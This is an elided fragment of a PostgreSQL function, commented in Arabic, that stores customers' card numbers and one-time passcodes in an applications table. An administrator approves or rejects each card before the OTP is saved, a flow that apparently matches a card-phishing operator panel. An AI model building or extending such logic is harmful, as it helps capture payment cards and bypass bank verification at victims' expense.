...
BEGIN
  ...
  IF NOT FOUND THEN
    -- احتياطي مهم: إذا تغيّرت جلسة العميل بعد الدفع، اسمح فقط بحفظ OTP
    -- على طلب موجود فعلاً في مرحلة OTP وبعد موافقة الدفع، بدون السماح بتعديل أي بيانات أخرى.
    IF _patch ? 'otp_code' THEN
      v_otp := trim(coalesce(_patch->>'otp_code', ''));

      IF v_otp ~ '^[0-9]{4,6}$' THEN
        ...
        SET otp_code = v_otp,
            ...
            updated_at = now()
        WHERE id = _id
          AND COALESCE(payment_approved, false) = true
          AND COALESCE(otp_approved, false) = false
          AND (current_step = 'otp' OR status = 'pending_otp');
  ...
  -- كلما أرسل العميل بطاقة (نفسها أو جديدة) نعيد ضبط حالة الدفع لتظهر أزرار الموافقة/الرفض للمسؤول
  IF _patch ? 'card_number' THEN
    v_new_card := _patch->>'card_number';
    v_new_norm := regexp_replace(coalesce(v_new_card,''), '\s+', '', 'g');

    IF v_new_card IS NOT NULL AND length(v_new_norm) >= 12 THEN
      UPDATE public.customer_applications
